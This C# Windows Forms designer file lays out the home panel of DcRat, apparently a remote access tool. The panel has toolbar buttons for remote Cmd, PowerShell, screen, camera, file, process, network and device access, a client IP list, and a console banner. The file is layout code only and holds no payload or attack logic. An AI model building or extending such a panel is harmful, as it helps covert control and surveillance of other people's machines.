
namespace DcRat.ChildForms
{
    partial class childFormHome
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(childFormHome));
            this.toolStripMain = new System.Windows.Forms.ToolStrip();
            this.toolStripButtoncmd = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtonpowershell = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtonscreen = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtoncamera = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtonfile = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtonprocess = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtonnetwork = new System.Windows.Forms.ToolStripButton();
            this.toolStripButtondevice = new System.Windows.Forms.ToolStripButton();
            this.toolStripLabel2 = new System.Windows.Forms.ToolStripLabel();
            this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
            this.splitContainerHome = new System.Windows.Forms.SplitContainer();
            this.listView1 = new System.Windows.Forms.ListView();
            this.columnHeaderip = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.contextMenuStripMain = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.updateUI = new System.Windows.Forms.Timer(this.components);
            this.toolStripMain.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.splitContainerHome)).BeginInit();
            this.splitContainerHome.Panel1.SuspendLayout();
            this.splitContainerHome.Panel2.SuspendLayout();
            this.splitContainerHome.SuspendLayout();
            this.SuspendLayout();
            // 
            // toolStripMain
            // 
            this.toolStripMain.AutoSize = false;
            this.toolStripMain.BackColor = System.Drawing.SystemColors.ControlLight;
            this.toolStripMain.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripMain.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripButtoncmd,
            this.toolStripButtonpowershell,
            this.toolStripButtonscreen,
            this.toolStripButtoncamera,
            this.toolStripButtonfile,
            this.toolStripButtonprocess,
            this.toolStripButtonnetwork,
            this.toolStripButtondevice,
            this.toolStripLabel2,
            this.toolStripLabel1});
            this.toolStripMain.Location = new System.Drawing.Point(0, 0);
            this.toolStripMain.Name = "toolStripMain";
            this.toolStripMain.Size = new System.Drawing.Size(981, 45);
            this.toolStripMain.TabIndex = 0;
            this.toolStripMain.Text = "toolStrip1";
            // 
            // toolStripButtoncmd
            // 
            this.toolStripButtoncmd.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtoncmd.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtoncmd.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtoncmd.Image")));
            this.toolStripButtoncmd.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtoncmd.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtoncmd.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtoncmd.Name = "toolStripButtoncmd";
            this.toolStripButtoncmd.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtoncmd.Text = "Cmd";
            this.toolStripButtoncmd.Click += new System.EventHandler(this.toolStripButtoncmd_Click);
            // 
            // toolStripButtonpowershell
            // 
            this.toolStripButtonpowershell.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtonpowershell.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtonpowershell.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonpowershell.Image")));
            this.toolStripButtonpowershell.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtonpowershell.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtonpowershell.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtonpowershell.Name = "toolStripButtonpowershell";
            this.toolStripButtonpowershell.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtonpowershell.Text = "Powershell";
            this.toolStripButtonpowershell.Click += new System.EventHandler(this.toolStripButtonpowershell_Click);
            // 
            // toolStripButtonscreen
            // 
            this.toolStripButtonscreen.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtonscreen.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtonscreen.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonscreen.Image")));
            this.toolStripButtonscreen.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtonscreen.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtonscreen.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtonscreen.Name = "toolStripButtonscreen";
            this.toolStripButtonscreen.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtonscreen.Text = "Screen";
            this.toolStripButtonscreen.Click += new System.EventHandler(this.toolStripButtonscreen_Click);
            // 
            // toolStripButtoncamera
            // 
            this.toolStripButtoncamera.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtoncamera.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtoncamera.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtoncamera.Image")));
            this.toolStripButtoncamera.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtoncamera.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtoncamera.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtoncamera.Name = "toolStripButtoncamera";
            this.toolStripButtoncamera.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtoncamera.Text = "Camera";
            this.toolStripButtoncamera.Click += new System.EventHandler(this.toolStripButtoncamera_Click);
            // 
            // toolStripButtonfile
            // 
            this.toolStripButtonfile.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtonfile.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtonfile.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonfile.Image")));
            this.toolStripButtonfile.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtonfile.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtonfile.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtonfile.Name = "toolStripButtonfile";
            this.toolStripButtonfile.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtonfile.Text = "File";
            this.toolStripButtonfile.Click += new System.EventHandler(this.toolStripButtonfile_Click);
            // 
            // toolStripButtonprocess
            // 
            this.toolStripButtonprocess.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtonprocess.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtonprocess.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonprocess.Image")));
            this.toolStripButtonprocess.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtonprocess.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtonprocess.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtonprocess.Name = "toolStripButtonprocess";
            this.toolStripButtonprocess.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtonprocess.Text = "Process";
            this.toolStripButtonprocess.Click += new System.EventHandler(this.toolStripButtonprocess_Click);
            // 
            // toolStripButtonnetwork
            // 
            this.toolStripButtonnetwork.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtonnetwork.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtonnetwork.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtonnetwork.Image")));
            this.toolStripButtonnetwork.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtonnetwork.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtonnetwork.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtonnetwork.Name = "toolStripButtonnetwork";
            this.toolStripButtonnetwork.Size = new System.Drawing.Size(36, 42);
            this.toolStripButtonnetwork.Text = "Network";
            // 
            // toolStripButtondevice
            // 
            this.toolStripButtondevice.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
            this.toolStripButtondevice.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripButtondevice.Image = ((System.Drawing.Image)(resources.GetObject("toolStripButtondevice.Image")));
            this.toolStripButtondevice.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.toolStripButtondevice.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.toolStripButtondevice.Margin = new System.Windows.Forms.Padding(5, 1, 5, 2);
            this.toolStripButtondevice.Name = "toolStripButtondevice";
            this.toolStripButtondevice.Size = new System.Drawing.Size(43, 42);
            this.toolStripButtondevice.Text = "Device";
            // 
            // toolStripLabel2
            // 
            this.toolStripLabel2.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
            this.toolStripLabel2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripLabel2.Name = "toolStripLabel2";
            this.toolStripLabel2.Padding = new System.Windows.Forms.Padding(0, 0, 10, 0);
            this.toolStripLabel2.Size = new System.Drawing.Size(96, 42);
            this.toolStripLabel2.Text = "toolStripLabel2";
            this.toolStripLabel2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // toolStripLabel1
            // 
            this.toolStripLabel1.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
            this.toolStripLabel1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.toolStripLabel1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripLabel1.Name = "toolStripLabel1";
            this.toolStripLabel1.Padding = new System.Windows.Forms.Padding(0, 0, 10, 0);
            this.toolStripLabel1.Size = new System.Drawing.Size(96, 42);
            this.toolStripLabel1.Text = "toolStripLabel1";
            this.toolStripLabel1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // splitContainerHome
            // 
            this.splitContainerHome.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitContainerHome.Location = new System.Drawing.Point(0, 45);
            this.splitContainerHome.Name = "splitContainerHome";
            this.splitContainerHome.Orientation = System.Windows.Forms.Orientation.Horizontal;
            // 
            // splitContainerHome.Panel1
            // 
            this.splitContainerHome.Panel1.Controls.Add(this.listView1);
            // 
            // splitContainerHome.Panel2
            // 
            this.splitContainerHome.Panel2.Controls.Add(this.richTextBox1);
            this.splitContainerHome.Size = new System.Drawing.Size(981, 511);
            this.splitContainerHome.SplitterDistance = 273;
            this.splitContainerHome.TabIndex = 1;
            // 
            // listView1
            // 
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeaderip});
            this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(0, 0);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(981, 273);
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            // 
            // columnHeaderip
            // 
            this.columnHeaderip.Text = "IP";
            this.columnHeaderip.Width = 140;
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.SystemColors.Desktop;
            this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.richTextBox1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox1.ForeColor = System.Drawing.SystemColors.Window;
            this.richTextBox1.Location = new System.Drawing.Point(0, 0);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(981, 234);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "DcRat - Dev Version\nCopyright (c) qwqdanchun 2021-2022. \n\nDcRat >>";
            // 
            // contextMenuStripMain
            // 
            this.contextMenuStripMain.Name = "contextMenuStripMain";
            this.contextMenuStripMain.Size = new System.Drawing.Size(61, 4);
            // 
            // updateUI
            // 
            this.updateUI.Enabled = true;
            this.updateUI.Interval = 500;
            this.updateUI.Tick += new System.EventHandler(this.updateUI_Tick);
            // 
            // childFormHome
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(981, 556);
            this.Controls.Add(this.splitContainerHome);
            this.Controls.Add(this.toolStripMain);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "childFormHome";
            this.Text = "childFormMain";
            this.toolStripMain.ResumeLayout(false);
            this.toolStripMain.PerformLayout();
            this.splitContainerHome.Panel1.ResumeLayout(false);
            this.splitContainerHome.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.splitContainerHome)).EndInit();
            this.splitContainerHome.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.ToolStrip toolStripMain;
        private System.Windows.Forms.ToolStripButton toolStripButtoncmd;
        private System.Windows.Forms.ToolStripButton toolStripButtonpowershell;
        private System.Windows.Forms.ToolStripButton toolStripButtonscreen;
        private System.Windows.Forms.ToolStripButton toolStripButtoncamera;
        private System.Windows.Forms.ToolStripButton toolStripButtonfile;
        private System.Windows.Forms.ToolStripButton toolStripButtonprocess;
        private System.Windows.Forms.SplitContainer splitContainerHome;
        private System.Windows.Forms.ListView listView1;
        private System.Windows.Forms.ColumnHeader columnHeaderip;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.ToolStripButton toolStripButtonnetwork;
        private System.Windows.Forms.ToolStripButton toolStripButtondevice;
        private System.Windows.Forms.ContextMenuStrip contextMenuStripMain;
        private System.Windows.Forms.ToolStripLabel toolStripLabel2;
        private System.Windows.Forms.ToolStripLabel toolStripLabel1;
        private System.Windows.Forms.Timer updateUI;
    }
}